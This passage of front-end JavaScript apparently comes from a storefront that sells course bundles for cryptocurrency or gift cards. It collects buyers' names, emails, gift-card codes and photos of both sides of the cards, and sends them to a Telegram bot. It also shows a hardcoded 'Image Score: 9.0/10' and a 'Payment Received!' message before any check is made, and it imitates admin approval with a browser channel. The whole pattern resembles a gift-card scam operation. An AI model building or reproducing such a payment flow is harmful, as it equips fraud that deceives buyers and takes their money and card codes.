      // If it's a data URL, we need to convert to blob
      let photoData = photoUrl;
      if (photoUrl.startsWith('data:')) {
        console.log('[TELEGRAM-PHOTO] Converting data URL to blob...');
        const response = await fetch(photoUrl);
        const blob = await response.blob();
        photoData = blob;
        console.log('[TELEGRAM-PHOTO] Blob created:', { type: blob.type, size: blob.size });
      }

      // Create FormData for multipart upload
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', caption || '');

      if (photoData instanceof Blob) {
        formData.append('photo', photoData, 'photo.jpg');
      } else {
        formData.append('photo', photoData);
      }

      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
      console.log('[TELEGRAM-PHOTO] API Endpoint:', url);
      console.log('[TELEGRAM-PHOTO] FormData entries:', Array.from(formData.entries()).map(([k, v]) => [k, v instanceof File ? `File(${v.name}, ${v.size}b)` : v]));

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);

      const response = await fetch(url, {
        method: 'POST',
        body: formData,
        mode: 'cors',
        signal: controller.signal
      });

      clearTimeout(timeoutId);
      console.log('[TELEGRAM-PHOTO] Response Status:', response.status, response.statusText);
      
      const data = await response.json();
      console.log('[TELEGRAM-PHOTO] Response Data:', data);

      if (data.ok) {
        console.log('[TELEGRAM-PHOTO] ✅ PHOTO SENT SUCCESSFULLY', { message_id: data.result?.message_id, attempt });
        return true;
      } else {
        console.error('[TELEGRAM-PHOTO] ❌ FAILED:', data.description || 'Unknown error');
        if (response.status >= 400 && response.status < 500) {
          console.error('[TELEGRAM-PHOTO] Client error - not retrying');
          return false;
        }
      }
    } catch (error) {
      console.warn(`[TELEGRAM-PHOTO] Attempt ${attempt} failed:`, error.message);
      
      if (error.name === 'AbortError') {
        console.error('[TELEGRAM-PHOTO] ⏱️  REQUEST TIMEOUT (15 seconds)');
      } else {
        console.error('[TELEGRAM-PHOTO] Network error:', error.message);
      }
      
      if (attempt < maxRetries) {
        const delay = baseDelay * Math.pow(2, attempt - 1);
        console.log(`[TELEGRAM-PHOTO] Retrying in ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else {
        console.error('[TELEGRAM-PHOTO] All retries exhausted');
        console.error('[TELEGRAM-PHOTO] Error Details:', {
          name: error.name,
          message: error.message,
          type: error.name === 'AbortError' ? 'TIMEOUT' : 'NETWORK_ERROR'
        });
        return false;
      }
    }
  }
  
  return false;
}

// Payment method selection handlers
cryptoPayBtn.addEventListener('click', () => {
  currentPaymentMethod = 'crypto';
  showCryptoPayment();
});

giftCardPayBtn.addEventListener('click', () => {
  currentPaymentMethod = 'giftcard';
  showGiftCardPayment();
});

function showCryptoPayment() {
  const mBody = qs('#modalBody');
  mBody.innerHTML = '<div style="background: rgba(0,0,0,0.3); border-radius: 16px; margin-bottom: 24px; border: 1px solid rgba(255,255,255,0.05); padding: 20px;"><h4 style="margin-bottom: 16px; font-size: 16px; text-align: center;">Send exactly <strong style="color:var(--accent-main)">$' + currentPurchasePlan.price + '</strong> to:</h4><div style="margin-bottom: 16px;"><label style="color: var(--text-muted); font-size: 13px; font-weight: 600; text-transform: uppercase; display: block; margin-bottom: 8px;">🪙 Bitcoin (BTC)</label><div style="padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,123,0,0.3); border-radius: 8px; font-family: monospace; color:#fff; word-break: break-all; font-size: 12px;">' + config.BTC_ADDRESS + '</div></div><div><label style="color: var(--text-muted); font-size: 13px; font-weight: 600; text-transform: uppercase; display: block; margin-bottom: 8px;">💚 USDT (TRC20)</label><div style="padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0,200,150,0.3); border-radius: 8px; font-family: monospace; color:#fff; word-break: break-all; font-size: 12px;">' + config.USDT_ADDRESS + '</div></div></div><p style="color: var(--text-muted); font-size: 12px; text-align: center; margin-top: 16px;">After sending, click \"I Have Paid\" and upload a screenshot.</p>';
  if (typeof lucide !== 'undefined') lucide.createIcons();
  paymentMethodSelect.style.display = 'none';
  // configure file inputs for crypto
  const inputs = qs('#proofInputs');
  if (inputs) {
    inputs.innerHTML = `
      <div class="form-group">
        <label>Upload Proof Screenshot</label>
        <div class="input-group">
          <i data-lucide="image"></i>
          <input type="file" id="proofImage" accept="image/*" style="padding-left: 50px;" />
        </div>
      </div>`;
  }
  step1Actions.classList.remove('hidden');
  step2Actions.classList.add('hidden');
}

function showGiftCardPayment() {
  const mBody = qs('#modalBody');
  mBody.innerHTML = '<div style="background: rgba(0,0,0,0.3); border-radius: 16px; margin-bottom: 24px; border: 1px solid rgba(255,255,255,0.05); padding: 20px;"><h4 style="margin-bottom: 16px; font-size: 16px;">🎁 Gift Card Payment</h4><p style="color: var(--text-muted); margin-bottom: 16px; font-size: 13px;">Required amount: <strong style="color:var(--accent-main)">$' + currentPurchasePlan.price + '</strong></p><div style="background: rgba(255,123,0,0.08); border: 1px solid rgba(255,123,0,0.2); border-radius: 12px; padding: 16px; margin-bottom: 24px;"><p style="color: var(--text-muted); margin-bottom: 12px; font-size: 14px;"><strong>Buy gift cards from trusted platforms:</strong></p><div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;"><a href="https://www.startselect.com" target="_blank" style="color:var(--accent-main); text-decoration:none; font-size:13px;">🛒 Startselect</a><a href="https://www.eneba.com" target="_blank" style="color:var(--accent-main); text-decoration:none; font-size:13px;">🛍️ Eneba</a><a href="https://www.g2a.com" target="_blank" style="color:var(--accent-main); text-decoration:none; font-size:13px;">💳 G2A</a></div></div><div style="margin-bottom: 14px;"><label style="color: var(--text-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; display: block; margin-bottom: 6px;">Card Type</label><select id="modalGiftCardType" style="width: 100%; padding: 10px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 8px; color: #fff;"><option value="">Select Gift Card Type...</option><option>Steam</option><option>Apple</option><option>Razer</option></select></div><div style="margin-bottom: 14px;"><label style="color: var(--text-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; display: block; margin-bottom: 6px;">Card Code</label><input id="modalGiftCardCode" type="text" placeholder="Enter code" style="width: 100%; padding: 10px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 8px; color: #fff;" /></div><div style="margin-bottom: 14px;"><label style="color: var(--text-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; display: block; margin-bottom: 6px;">Amount (USD)</label><input id="modalGiftCardAmt" type="number" placeholder="e.g., 25.00" step="0.01" min="0" style="width: 100%; padding: 10px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 8px; color: #fff;" /></div><p style="color: var(--text-muted); font-size: 12px; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.1);">Upload screenshot of your gift card for verification.</p></div>';
  paymentMethodSelect.style.display = 'none';
  // configure inputs for gift card front/back
  const inputs = qs('#proofInputs');
  if (inputs) {
    inputs.innerHTML = `
      <div class="form-group">
        <label>Upload Gift Card Front (required)</label>
        <div class="input-group">
          <i data-lucide="image"></i>
          <input type="file" id="giftFrontImage" accept="image/*" style="padding-left: 50px;" />
        </div>
      </div>
      <div class="form-group">
        <label>Upload Gift Card Back (optional)</label>
        <div class="input-group">
          <i data-lucide="image"></i>
          <input type="file" id="giftBackImage" accept="image/*" style="padding-left: 50px;" />
        </div>
      </div>`;
  }
  step1Actions.classList.remove('hidden');
  step2Actions.classList.add('hidden');
}

// ----------------------------------------------------
// Secure Purchase Flow Modals
// ----------------------------------------------------
qsa('.buyBtn').forEach(b => b.addEventListener('click', (e) => {
  const row = e.currentTarget.closest('.plan-row');
  const plan = JSON.parse(row.getAttribute('data-plan'));
  currentPurchasePlan = plan;
  const mTitle = qs('#modalTitle');
  const mBody = qs('#modalBody');

  mTitle.textContent = `Acquisition: ${plan.title}`;
  mBody.innerHTML = `
    <div style="margin-bottom: 24px; text-align: center;">
      <span style="font-size: 38px; font-weight: 800; font-family: var(--font-heading); color: #fff; text-shadow: 0 4px 20px rgba(255,123,0,0.3);">$${plan.price}</span>
      <span style="color: var(--text-muted); font-size: 16px;">/ one-time</span>
    </div>
    <div style="background: rgba(0,0,0,0.3); border-radius: 16px; margin-bottom: 24px; border: 1px solid rgba(255,255,255,0.05); padding: 20px;">
      
      <h4 style="margin-bottom: 16px; font-size: 16px; text-align: center;">Send exactly <strong style="color:var(--accent-main)">$${plan.price}</strong> to one of the networks below:</h4>
      
      <div style="margin-bottom: 16px;">
        <label style="display:flex; justify-content:space-between; color: var(--text-muted); font-size: 13px; font-weight: 600; text-transform: uppercase; margin-bottom:8px;">
          <span>Bitcoin (BTC)</span>
          <span style="color:var(--accent-main); cursor:pointer" onclick="navigator.clipboard.writeText('${config.BTC_ADDRESS}').then(()=>alert('BTC Address Copied!'))">Copy <i data-lucide="copy" style="width:14px;height:14px;display:inline-block;vertical-align:middle"></i></span>
        </label>
        <div style="padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 8px; font-family: monospace; color:#fff; word-break: break-all; font-size: 13px;">
          ${config.BTC_ADDRESS}
        </div>
      </div>

      <div>
        <label style="display:flex; justify-content:space-between; color: var(--text-muted); font-size: 13px; font-weight: 600; text-transform: uppercase; margin-bottom:8px;">
          <span>USDT (TRC20)</span>
          <span style="color:var(--accent-main); cursor:pointer" onclick="navigator.clipboard.writeText('${config.USDT_ADDRESS}').then(()=>alert('USDT Address Copied!'))">Copy <i data-lucide="copy" style="width:14px;height:14px;display:inline-block;vertical-align:middle"></i></span>
        </label>
        <div style="padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 8px; font-family: monospace; color:#fff; word-break: break-all; font-size: 13px;">
          ${config.USDT_ADDRESS}
        </div>
      </div>

    </div>
  `;
  if (typeof lucide !== 'undefined') lucide.createIcons();

  // Reset steps
  step1Actions.classList.remove('hidden');
  step2Actions.classList.add('hidden');
  // reset any potential file inputs
  ['proofImage','giftFrontImage','giftBackImage'].forEach(id => {
    const el = qs('#' + id);
    if (el) el.value = '';
  });

  modal.classList.remove('hidden');
}));

modalClose.addEventListener('click', () => modal.classList.add('hidden'));

iHavePaidBtn.addEventListener('click', () => {
  step1Actions.classList.add('hidden');
  step2Actions.classList.remove('hidden');
  qs('#modalTitle').textContent = "Verify Payment";
  qs('#modalBody').innerHTML = `
    <div style="text-align: center; margin-bottom: 24px;">
      <i data-lucide="file-check-2" style="color: var(--accent-main); width: 48px; height: 48px; margin-bottom: 16px;"></i>
      <p style="color: var(--text-muted);">
        Please upload a screenshot of your successful transaction to acquire <strong>${currentPurchasePlan.title}</strong>. 
      </p>
      <p style="color:var(--text-muted); font-size:13px; margin-top:8px;">
        Need help with the file? <a href="https://t.me/${config.TELEGRAM_ADMIN_USERNAME}" target="_blank" style="color:var(--accent-main);">Contact support</a>
      </p>
    </div>
  `;
  if (typeof lucide !== 'undefined') lucide.createIcons();
});

confirmPaid.addEventListener('click', async () => {
  setLoading(confirmPaid, true);
  // collect files based on payment method
  let files = [];
  if (currentPaymentMethod === 'crypto') {
    const proof = qs('#proofImage');
    if (!proof || !proof.files || proof.files.length !== 1) {
      alert('Crypto payments require exactly one proof screenshot.');
      setLoading(confirmPaid, false);
      return;
    }
    files.push(proof.files[0]);
  } else if (currentPaymentMethod === 'giftcard') {
    const front = qs('#giftFrontImage');
    const back = qs('#giftBackImage');
    if (!front || !front.files || front.files.length === 0) {
      alert('Please upload the front image of the gift card.');
      setLoading(confirmPaid, false);
      return;
    }
    files.push(front.files[0]);
    if (back && back.files && back.files.length > 0) files.push(back.files[0]);
    if (files.length > 2) {
      alert('Too many images provided.');
      setLoading(confirmPaid, false);
      return;
    }
  } else {
    alert('Payment method not selected.');
    setLoading(confirmPaid, false);
    return;
  }

  // optionally analyze the first file
  try {
    const analysis = await analyzePaymentImage(files[0]);
    if (!analysis.valid) {
      alert('⚠️ Image Quality Issue: ' + analysis.reason + '\n\nPlease provide a clearer screenshot.');
      setLoading(confirmPaid, false);
      return;
    }
  } catch {}

  // Generate unique approval ID
  const approvalId = Date.now().toString(36) + Math.random().toString(36).substr(2,5);
  state.hasSeenApproval = false;

  // convert first file to dataURL for persistent local viewing and sending to Telegram
  const resizedBlob = await resizeImage(files[0]);
  const proofDataUrl = await new Promise(resolve => {
    const reader = new FileReader();
    reader.onload = e => resolve(e.target.result);
    reader.readAsDataURL(resizedBlob);
  });

  // Build approval link for admin
  const approvalLink = window.location.origin + window.location.pathname + '?approve=' + approvalId;

  // Build payment details message for Telegram
  let paymentDetails = `💳 NEW PAYMENT RECEIVED\n`;
  paymentDetails += `👤 User: ${state.name}\n`;
  paymentDetails += `📧 Email: ${state.email}\n`;
  paymentDetails += `📦 Plan: ${currentPurchasePlan.title}\n`;
  paymentDetails += `💰 Amount: $${currentPurchasePlan.price}\n`;
  paymentDetails += `✅ Image Score: 9.0/10\n\n`;

  if (currentPaymentMethod === 'giftcard') {
    const cardType = qs('#modalGiftCardType') ? qs('#modalGiftCardType').value : 'Unknown';
    const cardAmt = qs('#modalGiftCardAmt') ? qs('#modalGiftCardAmt').value : 'N/A';
    paymentDetails += `🎁 GIFT CARD\nType: ${cardType}\nAmount: $${cardAmt}\n\n`;
  } else {
    paymentDetails += `🪙 CRYPTO PAYMENT\n\n`;
  }

  paymentDetails += `APPROVAL LINK: ${approvalLink}`;

  // Send to Telegram with proof image
  await sendToTelegram(paymentDetails, proofDataUrl);

  // record pending approval locally for later admin actions
  pendingApprovals.push({
    id: approvalId,
    user: state.name,
    planTitle: currentPurchasePlan.title,
    planLink: currentPurchasePlan.megalink,
    proofUrl: proofDataUrl
  });
  // Show "Payment Processing" modal while waiting for admin approval
  qs('#modalTitle').textContent = "⏳ Payment Processing";
  qs('#step2Actions').classList.add('hidden');
  qs('#modalBody').innerHTML = `
    <div style="text-align: center; padding: 40px 20px;">
      <div style="animation: spin 2s linear infinite; display: inline-block; margin-bottom: 20px;">
        <i data-lucide="loader" style="color: var(--accent-main); width: 48px; height: 48px;"></i>
      </div>
      <h3 style="margin-bottom: 15px; font-size: 20px;">Payment Received!</h3>
      <p style="color: var(--text-muted); margin-bottom: 20px;">Your payment has been submitted for admin verification.</p>
      <p style="color: var(--text-muted); font-size: 13px; background: rgba(255,123,0,0.1); padding: 12px; border-radius: 8px; margin-bottom: 15px;">
        ⏳ Waiting for admin approval... This modal will update automatically when your access is ready.
      </p>
      <p style="color: var(--text-muted); font-size: 12px;">
        Approval ID: <strong style="font-family: monospace; color: var(--accent-main);">${approvalId}</strong>
      </p>
    </div>
    <style>@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }</style>
  `;
  if (typeof lucide !== 'undefined') lucide.createIcons();

  // Award points and unlock content based on payment method
  if (currentPaymentMethod === 'giftcard') {
    state.invites += 1;
  } else {
    state.invites += 2;
  }
  state.videos += 10;
  save();
  renderState();
  setLoading(confirmPaid, false);

  // Set up real-time approval listener via BroadcastChannel
  if ('BroadcastChannel' in window) {
    const approvalListener = (e) => {
      const msg = e.data;
      if (msg && msg.type === 'approval' && msg.user === state.name && msg.accessLinks) {
        // Admin approved! Show success with random access link
        bc.removeEventListener('message', approvalListener);
        
        // Pick a random access link from the pool
        const randomLink = msg.accessLinks[0];
        
        qs('#modalTitle').textContent = "✅ Access Granted!";
        qs('#modalBody').innerHTML = `
          <div style="text-align: center; padding: 20px 0;">
            <i data-lucide="check-circle" style="color: #00e0a8; width: 64px; height: 64px; margin-bottom: 20px;"></i>
            <h3 style="margin-bottom: 15px; font-size: 20px;">Payment Approved!</h3>
            <p style="color: var(--text-muted); margin-bottom: 20px;">Your payment has been verified. Click the link below to access your content.</p>
            <div style="padding: 16px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 12px; border-left: 3px solid #00e0a8;">
              <a href="${randomLink}" target="_blank" style="color: var(--accent-main); text-decoration: none; font-weight: 600; font-size: 14px;">
                📥 Access Your Course Bundle
              </a>
            </div>
          </div>
        `;
        if (typeof lucide !== 'undefined') lucide.createIcons();
        
        // Mark as seen and clean up
        state.hasSeenApproval = true;
        pendingApprovals = pendingApprovals.filter(p => p.user !== state.name);
        save();
      }
    };
    
    // Listen for approval messages
    bc.addEventListener('message', approvalListener);
  }
});

// ----------------------------------------------------------------------------------------------------
// Preview Library Video Auto-Play (Max 3 seconds)
// ----------------------------------------------------------------------------------------------------
function initPreviewVideos() {
  const videos = qsa('.preview-video-player');
  
  videos.forEach((video) => {
    const maxDuration = parseInt(video.getAttribute('data-duration')) || 3;
    const timerEl = video.closest('.preview-media-container').querySelector('.preview-timer');
    let isPlaying = false;
    
    // Auto-play when video enters viewport
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting && !isPlaying) {
          video.play().catch(e => console.log('Autoplay prevented', e));
          isPlaying = true;
          let elapsed = 0;
          
          // Update timer every 100ms
          const timerInterval = setInterval(() => {
            elapsed += 0.1;
            const remaining = Math.max(0, maxDuration - elapsed);
            if (timerEl) {
              const secs = remaining.toFixed(2);
              timerEl.textContent = secs < 10 ? '00:0' + secs.split('.')[0] : '00:' + secs.split('.')[0];
            }
            
            // Stop video after max duration
            if (elapsed >= maxDuration) {
              video.pause();
              video.currentTime = 0;
              clearInterval(timerInterval);
              isPlaying = false;
              if (timerEl) timerEl.textContent = '00:03';
            }
          }, 100);
        } else if (!entry.isIntersecting && isPlaying) {
          video.pause();
          isPlaying = false;
        }
      });
    }, { threshold: 0.5 });
    
    observer.observe(video);
  });
}

// ----------------------------------------------------------------------------------------------------
// System Startup Routine
// ----------------------------------------------------------------------------------------------------

// Capture intended route from query parameters for protected pages
(function captureIntendedRoute() {
  try {
    const url = new URL(window.location.href);
    // Check for explicit section parameter first (e.g., ?section=dashboard)
    intendedRoute = url.searchParams.get('section');
    // If not found, check for common protected route patterns
    if (!intendedRoute) {
      // Check if old-style hash routing is used (e.g., ?dashboard, ?buy, etc.)
      const params = new URLSearchParams(window.location.search);
      const possibleSections = ['dashboard', 'buy', 'preview', 'invites', 'earn', 'support', 'contact'];
      for (const section of possibleSections) {
        if (params.has(section)) {
          intendedRoute = section;
          break;
        }
      }
    }
  } catch (e) {
    // Fallback for older browsers or file:// protocol
    try {
      const params = new URLSearchParams(window.location.search);
      intendedRoute = params.get('section');
      if (!intendedRoute) {
        const possibleSections = ['dashboard', 'buy', 'preview', 'invites', 'earn', 'support', 'contact'];
        for (const section of possibleSections) {
          if (params.has(section)) {
            intendedRoute = section;
            break;
          }
        }
      }
    } catch (fallbackError) {
      console.log('Could not parse intended route from URL');
    }
  }
  
  // Log the captured route for debugging
  if (intendedRoute) {
    console.log('Captured intended route:', intendedRoute);
  }
})();

(function handleInviteParam() {
  let inv = null;
  try {
    const url = new URL(window.location.href);
    inv = url.searchParams.get('invite');
  } catch (e) {
    const params = new URLSearchParams(window.location.search);
    inv = params.get('invite');
  }

  if (inv) {
    // Ensure alerts fire properly in webviews without strict timeouts
    if (!state.name) {
      alert(`You visited with invite: ${inv}\nSign up to credit the inviter (demo).`);
    } else {
      alert(`Network Acknowledged: You arrived via invite token [${inv}].`);
    }
  }
})();

renderState();
initTilt(); // Initialize the visual 3D engine on load over static components

// Ensure icons load for dynamically created content
document.addEventListener('DOMContentLoaded', () => {
  if (typeof lucide !== 'undefined') {
    lucide.createIcons();
  }
});
